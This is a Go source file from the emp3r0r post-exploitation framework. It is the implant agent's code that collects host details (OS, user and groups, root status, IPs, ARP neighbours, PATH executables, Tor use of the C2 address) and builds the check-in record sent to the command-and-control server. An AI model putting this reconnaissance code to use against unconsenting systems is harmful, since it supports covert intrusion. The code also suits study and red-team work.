package agentutils

import (
	"fmt"
	"os"
	"os/user"
	"runtime"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jaypipes/ghw"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// GatherSystemDetails build system info object (minimal for startup)
func GatherSystemDetails() *def.Emp3r0rAgent {
	logging.Println("Collecting system info for reporting status")
	var info def.Emp3r0rAgent
	osinfo := sysinfo.GetOSInfo()
	info.GOOS = runtime.GOOS

	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
	hostname, err := os.Hostname()
	if err != nil {
		logging.Printf("Gethostname: %v", err)
		hostname = "no_name"
	}

	info.CWD, err = os.Getwd()
	if err != nil {
		logging.Printf("Getwd: %v", err)
		info.CWD = "."
	}

	common.RuntimeConfig.AgentTag = util.GenAgentTag(common.RuntimeConfig.AgentUUID)
	info.Tag = common.RuntimeConfig.AgentTag // use hostid
	info.UUID = common.RuntimeConfig.AgentUUID
	info.C2Host = common.RuntimeConfig.CCAddress

	// Identity (TOFU) — ensure key is generated
	if AgentKey == nil {
		if err := GetAgentKey(); err != nil {
			logging.Errorf("Failed to get agent key: %v", err)
		}
	}
	// Serialize key into payload. Must be a separate if (not else) — the block
	// above may have just generated the key and we must serialize it either way.
	if AgentKey != nil {
		pubKeyBytes, err := transport.PublicKeyToPEM(&AgentKey.PublicKey)
		if err != nil {
			logging.Errorf("PublicKeyToPEM: %v", err)
		} else {
			info.PublicKey = string(pubKeyBytes)
		}
	}

	// Use CA-signed signature for check-in (proof of origin)
	// The agent key will be used for subsequent message tunnel signing
	info.UUIDSig = common.RuntimeConfig.AgentUUIDSig

	info.Hostname = hostname
	info.Name = strings.Split(info.Tag, "-agent")[0]
	info.Version = def.Version
	info.Kernel = osinfo.Kernel
	info.Arch = osinfo.Architecture
	// Minimal: skip hardware info
	info.CPU = "N/A"
	info.GPU = "N/A"
	info.Mem = "N/A"
	info.Hardware = "N/A"
	info.Container = "N/A" // sysinfo.CheckContainer() might be light, but skipping for minimal
	info.Transport = genC2TransportString()
	def.Transport = info.Transport

	// have root?
	info.HasRoot = sysinfo.HasRoot()

	// process
	info.Process = getAgentProcess()

	// user account info
	u, err := user.Current()
	if err != nil {
		logging.Println(err)
		info.User = "Not available"
	}
	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	// User groups
	gids, err := u.GroupIds()
	if err != nil {
		logging.Printf("GroupIds: %v", err)
	}
	info.Groups = strings.Join(gids, ",")

	// Uptime
	info.Uptime = GetUptime()

	// is cc on tor?
	info.HasTor = netutil.IsTor(def.CCAddress)

	// has internet?
	// Minimal: skip connectivity test
	info.HasInternet = false
	info.NCSIEnabled = false

	// IP address?
	info.IPs = netutil.IPa()

	// arp -a ?
	// Minimal: skip ARP
	info.ARP = []string{}

	// exes in PATH
	// Minimal: skip PATH scan
	info.Exes = []string{}

	return &info
}

// GetUptime get system uptime
func GetUptime() string {
	return util.GetUptime()
}

// CollectFullSystemInfo build full system info object
func CollectFullSystemInfo() *def.Emp3r0rAgent {
	logging.Println("Collecting full system info")
	var info def.Emp3r0rAgent
	osinfo := sysinfo.GetOSInfo()
	info.GOOS = runtime.GOOS

	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
	hostname, err := os.Hostname()
	if err != nil {
		logging.Printf("Gethostname: %v", err)
		hostname = "unknown_host"
	}
	// read productInfo
	info.Product, err = ghw.Product(ghw.WithDisableWarnings())
	if err != nil {
		logging.Printf("ProductInfo: %v", err)
	}
	info.CWD, err = os.Getwd()
	if err != nil {
		logging.Printf("Getwd: %v", err)
		info.CWD = "."
	}

	info.Tag = common.RuntimeConfig.AgentTag
	info.UUID = common.RuntimeConfig.AgentUUID
	info.UUIDSig = common.RuntimeConfig.AgentUUIDSig
	info.Hostname = hostname
	info.Name = strings.Split(info.Tag, "-agent")[0]
	info.Version = def.Version
	info.Kernel = osinfo.Kernel
	info.Arch = osinfo.Architecture
	info.CPU = util.GetCPUInfo()
	info.GPU = util.GetGPUInfo()
	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
	info.Hardware = util.CheckProduct(info.Product)
	info.Container = sysinfo.CheckContainer()
	info.Transport = genC2TransportString()
	def.Transport = info.Transport

	// have root?
	info.HasRoot = sysinfo.HasRoot()

	// process
	info.Process = getAgentProcess()

	// user account info
	u, err := user.Current()
	if err != nil {
		logging.Println(err)
		info.User = "Not available"
	}
	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	// is cc on tor?
	info.HasTor = netutil.IsTor(def.CCAddress)

	// has internet?
	if common.RuntimeConfig.EnableNCSI {
		info.HasInternet = transport.TestConnectivity(transport.UbuntuConnectivityURL, common.RuntimeConfig.C2TransportProxy)
		info.NCSIEnabled = true
	} else {
		info.HasInternet = false
		info.NCSIEnabled = false
	}

	// IP address?
	info.IPs = netutil.IPa()

	// arp -a ?
	info.ARP = netutil.IPNeigh()

	// exes in PATH
	info.Exes = util.ScanPATH()

	return &info
}

// GetContainerName check if we are in a container
func GetContainerName() string {
	return sysinfo.CheckContainer()
}

// GetUserAndGroups returns user and group info
func GetUserAndGroups() (string, string) {
	u, err := user.Current()
	if err != nil {
		logging.Println(err)
		return "Not available", ""
	}
	userStr := fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	gids, err := u.GroupIds()
	if err != nil {
		logging.Printf("GroupIds: %v", err)
	}

	var groupNames []string
	for _, gid := range gids {
		group, err := user.LookupGroupId(gid)
		if err != nil {
			groupNames = append(groupNames, gid) // Fallback to ID
			continue
		}
		groupNames = append(groupNames, fmt.Sprintf("%s(%s)", group.Name, gid))
	}
	groupsStr := strings.Join(groupNames, ",")

	return userStr, groupsStr
}
